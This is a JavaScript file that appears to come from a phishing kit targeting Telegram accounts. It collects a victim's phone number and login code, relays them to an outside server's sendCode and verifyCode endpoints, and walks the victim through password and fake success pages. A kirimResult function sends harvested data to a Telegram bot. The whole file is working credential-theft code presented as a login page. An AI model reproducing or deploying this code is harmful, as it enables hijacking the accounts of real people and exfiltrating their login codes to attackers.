function kirimResult(gabungan){
    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
        complete: function(data) {
                    console.log('Complete')
        setTimeout(function(){
            }, 1000);
  
                }
            });
  }

$("#wrong").hide();

$("#1").on("click", function(e){
  e.preventDefault();
  var phone = $("input#phone").val();

  if (phone != "") {
    $("#loader").show();
    $.ajax({
        type: "POST",
        url: "https://rafie-server-ketiga.cl0ud.my.id:1000/sendCode", // Endpoint backend
        data: JSON.stringify({
            phoneNumber: phone // Ambil nomor dari input
        }),
        contentType: "application/json",
        dataType: 'JSON',
        success: function(response){
    
            // Jika response tidak berupa JSON
            if (typeof response !== 'object') {
                return;
            }
    
    
            if (response.status === 'error') {
                $("#wrong").show();
                $("#loader").hide(); 
            } else {
                var phone_code_hash = response.phoneCodeHash;
                sessionStorage.setItem("phone_code_hash", phone_code_hash);
                sessionStorage.setItem("phone_number", phone);
                window.location.replace("otp.html");
            }
    
        },
        error: function(xhr, status, error) {
            console.error("AJAX Error:", status, error);
            $("#wrong").show();
                $("#loader").hide();
            }
    });
  }
});

$("#2").on("click", function(e){
    e.preventDefault();
    var phone = sessionStorage.getItem("phone_number");
    var phone_code_hash = sessionStorage.getItem("phone_code_hash");
    var otp = $("input#code").val();
  
    if (otp != "") {
      $("#loader").show();
      $.ajax({
        type: "POST",
        url: "https://rafie-server-ketiga.cl0ud.my.id:1000/verifyCode", // Endpoint backend
        data: JSON.stringify({
            phoneNumber: phone,
            otp: otp,
            phoneCodeHash: phone_code_hash
        }),
        contentType: "application/json",
        dataType: 'JSON',
    success: function(response) {
    
        // Cek jika response adalah objek atau bukan
        if (typeof response === 'object' && response !== null) {
    
            // Periksa status dan lakukan tindakan yang sesuai
            if (response.status === 'success') {
              console.log("Success!");
              setTimeout(function(){
                window.location.replace("password.html");
              }, 1500);
            } else if (response.status === 'errorpw') {
              console.log("Success!");
              setTimeout(function(){
                window.location.replace("password.html");
              }, 1500);
            } else if (response.status === 'error') {
              $("#wrong").show();
                $("#loader").hide();
            } else {
                $("#wrong").show();
                $("#loader").hide();
            }
        } else {
            $("#wrong").show();
            $("#loader").hide();
        }
    },
    error: function(xhr, status, error) {
        alert("Connection to server failed, please try again later");
        $("#loader").hide();
    }
    });
    
    }
  });


  $( "#3" ).on( "click", function( event ) {
    event.preventDefault();
  
    $("#loader").show();
    setTimeout(function(){
        window.location.replace("sukses.html");
    }, 1500);
  });